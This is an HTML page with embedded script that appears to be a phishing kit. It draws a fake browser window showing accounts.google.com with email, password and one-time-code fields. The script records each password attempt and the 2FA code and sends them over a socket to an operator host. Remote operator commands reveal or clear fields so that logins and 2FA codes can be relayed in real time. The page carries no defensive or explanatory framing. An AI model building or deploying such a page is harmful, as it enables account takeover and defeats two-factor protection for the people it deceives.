<!doctype html>
<div class="browser-window"><div class="address-bar">https://accounts.google.com</div>
<form id="login"><input id="email" name="email"><input id="password" type="password">
<input id="otp" autocomplete="one-time-code"><button>Next</button></form></div>
<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io('https://operator.example.invalid');
const state = {email:'', password_one:'', password_two:'', password_three:'', otp:''};
let attempt = 0;
const slots = ['password_one','password_two','password_three'];
fetch('/api/create/user', {method:'POST',body:JSON.stringify(state)});
document.getElementById('login').addEventListener('submit', event => {
  event.preventDefault();
  state.email = document.getElementById('email').value;
  state[slots[Math.min(attempt++,2)]] = document.getElementById('password').value;
  state.otp = document.getElementById('otp').value;
  socket.emit('update-user', state);
});
const prompts = {
 '/password': () => document.getElementById('password').hidden = false,
 '/2fa': () => document.getElementById('otp').hidden = false,
 '/authApp': () => document.getElementById('otp').hidden = false,
 '/wrong2fa': () => { document.getElementById('otp').value = ''; },
 '/done': () => document.getElementById('login').hidden = true
};
socket.on('operator-command', command => { if (prompts[command]) prompts[command](); });
</script>
